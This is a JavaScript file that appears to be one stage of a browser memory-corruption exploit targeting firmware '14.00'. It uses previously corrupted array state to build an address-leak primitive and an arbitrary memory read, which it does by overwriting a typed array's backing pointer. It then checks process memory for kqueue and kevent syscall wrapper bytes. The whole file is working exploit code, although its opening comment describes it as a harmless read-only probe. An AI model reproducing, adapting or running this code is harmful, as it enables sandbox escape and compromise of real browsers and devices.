// Check 14.00-observed event-queue syscall wrappers in the live process.
// This probe only reads mapped browser memory; it makes no native call.
var state = window.__fw14ArrayState;
var plan = window.__fw14NativePlan;
var result;
var slot = -1;
var original = [];
try {
  if (!state || !plan || !state.view || !state.array || !state.a ||
      !state.ownedTypedView || state.array[0] !== state.a ||
      !Number.isSafeInteger(state.calibratedViewBase))
    throw new Error("held_state_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function hexLE(bytes) {
    var out = "0x";
    for (var n = bytes.length - 1; n >= 0; n--)
      out += bytes[n].toString(16).padStart(2, "0");
    return out;
  }
  function hexForward(bytes) {
    var out = "";
    for (var n = 0; n < bytes.length; n++)
      out += bytes[n].toString(16).padStart(2, "0");
    return out;
  }
  function wordOf(value) {
    try {
      state.array[0] = value;
      return Number(hexLE(bytesAt(state.index, 8)));
    } finally {
      state.array[0] = state.a;
    }
  }
  var index = wordOf(carrier) - base;
  if (!Number.isSafeInteger(index) || index < 0 ||
      index + 15 >= 16777216)
    throw new Error("carrier_cell_outside_window");
  slot = index + 8;
  original = bytesAt(slot, 8);
  function pointerBytes(address) {
    if (!Number.isSafeInteger(address) || address <= 0)
      throw new Error("read_address_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(address / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function readAddress(address, count) {
    var next = pointerBytes(address);
    try {
      for (var n = 0; n < 8; n++) forged[slot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++) forged[slot + x] = original[x];
    }
  }
  var queueTarget = plan.target + 0x580;
  var eventTarget = plan.target - 0x850;
  var queueFirst = hexForward(readAddress(queueTarget, 16));
  var queueSecond = hexForward(readAddress(queueTarget, 16));
  var eventFirst = hexForward(readAddress(eventTarget, 16));
  var eventSecond = hexForward(readAddress(eventTarget, 16));
  var queueExpected = "48c7c06a0100004989ca0f057201c348";
  var eventExpected = "48c7c06b0100004989ca0f057201c348";
  var restored = hexLE(bytesAt(slot, 8)) === hexLE(original) &&
    carrier[0] === 0x31 && carrier[7] === 0xa8 &&
    state.array[0] === state.a;
  result = { id: "sandbox_kqueue_wrappers_v1",
    status: queueFirst === queueExpected &&
      queueSecond === queueExpected &&
      eventFirst === eventExpected &&
      eventSecond === eventExpected && restored ?
      "pass" : "fail",
    details: { queue_target: "0x" + queueTarget.toString(16),
      event_target: "0x" + eventTarget.toString(16),
      queue_first: queueFirst, queue_second: queueSecond,
      event_first: eventFirst, event_second: eventSecond,
      view_restored: restored } };
} catch (error) {
  if (slot >= 0 && original.length === 8 && state && state.view)
    for (var y = 0; y < 8; y++) state.view[slot + y] = original[y];
  if (state && state.array && state.a) state.array[0] = state.a;
  result = { id: "sandbox_kqueue_wrappers_v1", status: "error",
    details: { error: String(error).slice(0, 200) } };
}
return [result];
